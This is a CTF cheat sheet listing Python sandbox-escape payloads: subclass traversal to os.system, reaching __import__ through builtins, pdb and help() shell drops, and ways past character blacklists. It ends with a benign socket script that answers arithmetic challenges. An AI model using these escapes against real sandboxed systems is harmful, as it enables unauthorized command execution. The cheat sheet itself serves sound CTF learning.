# Misc: PyJail Escapes & Automated Socket Scripting

## 1. PyJail (Python Sandbox Escape) Payloads

PyJail challenges restrict built-in functions (`eval`, `exec`, `open`, `import`). Here are reliable breakout vectors:

### A. Subclass Traversal (Reaching `<class 'os._wrap_close'>` or `subprocess.Popen`)
```python
# List subclasses:
[c.__name__ for c in ().__class__.__base__.__subclasses__()]

# Find index of os._wrap_close or Popen and run:
().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('sh')

# Or search automatically:
[x for x in ().__class__.__base__.__subclasses__() if 'wrap_close' in x.__name__][0].__init__.__globals__['system']('/bin/sh')
```

### B. Accessing `__builtins__`
```python
# Direct builtins access:
__builtins__.__dict__['__import__']('os').system('sh')

# Or via reload/globals:
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('sh')
```

### C. Direct Shell / Debugger
```python
breakpoint()    # Drops into pdb shell! From pdb, type: import os; os.system('sh')
help()          # From help menu, type: !sh
```

### D. Character Blacklist Bypasses
- If `.` is blocked: `getattr(__import__('os'), 'system')('sh')`
- If quotes (`"` or `'`) are blocked: `chr(115) + chr(104)` (`'sh'`)
- If `import` or `eval` is blocked: `globals()['__builtins__']`

---

## 2. Automated Socket Solver Template (`socket_solver.py`)

Often Misc challenges ask you to solve 100 rapid math or captcha problems over Netcat within 30 seconds.

```python
#!/usr/bin/env python3
import socket
import re

HOST = "challenge.ctf.com"
PORT = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

def recv_until(sock, delim=b"\n"):
    buf = b""
    while not buf.endswith(delim):
        chunk = sock.recv(1)
        if not chunk:
            break
        buf += chunk
    return buf

# Loop for 100 rounds
round_num = 1
while True:
    try:
        # Read server prompt
        data = s.recv(4096).decode()
        print(data, end="")

        if "flag{" in data.lower():
            print("\n[+] FOUND FLAG!")
            break

        # Example: Server sends "What is 45 + 12?"
        match = re.search(r"What is (\d+)\s*([\+\-\*])\s*(\d+)", data)
        if match:
            num1 = int(match.group(1))
            op = match.group(2)
            num2 = int(match.group(3))

            if op == '+': ans = num1 + num2
            elif op == '-': ans = num1 - num2
            elif op == '*': ans = num1 * num2

            print(f"[*] Round {round_num}: Answering {ans}")
            s.sendall(f"{ans}\n".encode())
            round_num += 1

    except Exception as e:
        print(f"[-] Connection ended or error: {e}")
        break

s.close()
```
